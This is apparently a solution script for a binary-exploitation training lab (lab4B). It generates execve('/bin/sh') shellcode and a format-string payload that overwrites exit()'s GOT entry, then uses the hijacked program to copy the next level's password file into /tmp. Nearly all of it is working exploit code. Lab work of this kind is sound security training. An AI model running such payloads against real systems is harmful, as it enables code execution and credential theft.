#!/bin/bash

# Useful observations looking at the disassembled program:
#
#   - The program calls exit() to terminate after the vulnerability
#   - Seems that we are able to play with GOT
#   - Good news for shellcoding, a /bin/sh string can be found in libc (at 0xb7f83a24). It is
#   always useful to look with peda for this kind of things that can make our shellcode more compact

# Now that we have a way of hijacking execution to get control of the program flow, we need
# the sellcode to make the program do whatever we want to.

# This script will assemble our shellcode
cat > /tmp/.shellgen.py <<EOF

import pwn

pwn.context.update(arch='i386', os='linux')

instructions = [
    'xor ecx, ecx',
    'mul ecx',
    'mov ebx, 0xb7f83a24',  # Memory address of /bin/sh
    'mov al, SYS_execve',   # SYS_execve defined in pwnlib.constants
    'int 0x80'
    ]

print ''.join(map(pwn.asm, instructions))

EOF

# Shellcode ready, we have to think of a place where we can store it. This could be
# an environment variable or the buffer itself, as it is ample enough for our shellcode to fit in

# I've decided here for an enviroment variable, as we can determine the address with more precission
# and we won't need to use a NOP sled.

export SHELLCODE=$(python /tmp/.shellgen.py)


# Now we have to overwrite the address of exit() at the GOT

# First, we get the offset where the exit() address is
offset=$(objdump -R /levels/lab04/lab4B | grep exit | cut -d" " -f1)

# Then we get the new address

cat > /tmp/.getenvaddr.c <<EOF

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char *p = getenv(argv[1]);

    /* after some experimenting, we can determine
     the formula to get the exact memory address.
     If this exploit fails (by throwing a segmentation fault),
     there is a big chance that you may have to change it 
     to fit your environment */

    p += ((strlen(argv[2]) - strlen(argv[0]))*2) - 12;

    printf("%p\n", p);
    return 0;
}

EOF

gcc -o /tmp/.getenvaddr /tmp/.getenvaddr.c

addr=$(/tmp/.getenvaddr SHELLCODE /levels/lab04/lab4B)

# Finally, a script that will create the format string exploit

cat > /tmp/.fsvgen.py <<EOF

import sys
import struct

goff  = int(sys.argv[1], 16)    # GOT offset
shell = int(sys.argv[2], 16)    # Shellcode address
boff  = int(sys.argv[3], 16)    # Buffer offset

# Let's start with the offset address, we will
# use two short writes, that is why we need
# the two byte addresses (in little endian order)
buf = struct.pack("<I", goff+2) + struct.pack("<I", goff)

# Then we need to write the first 2 bytes of the shellcode address
# to the GOT like this is:
buf += "%%%dx"%((shell>>16)-8)
buf += "%%%d\$hn" %(boff/4)

# Finally, the last 2 bytes
buf += "%%%dx"%((shell&0xffff)-(shell>>16))
buf += "%%%d\$hn" %((boff/4)+1)

print buf

EOF

# Password will be stored in /tmp/lab4B.pass
passfile="/tmp/lab4A.pass"

(python /tmp/.fsvgen.py $offset $addr "0x18"; echo "cat /home/lab4A/.pass > $passfile";) | /levels/lab04/lab4B
echo Password stored in $passfile

# Clean-up

echo Cleaning up dotfiles... ;
rm -f /tmp/.shellgen.py /tmp/.fsvgen.py /tmp/.getenvaddr /tmp/.getenvaddr.c
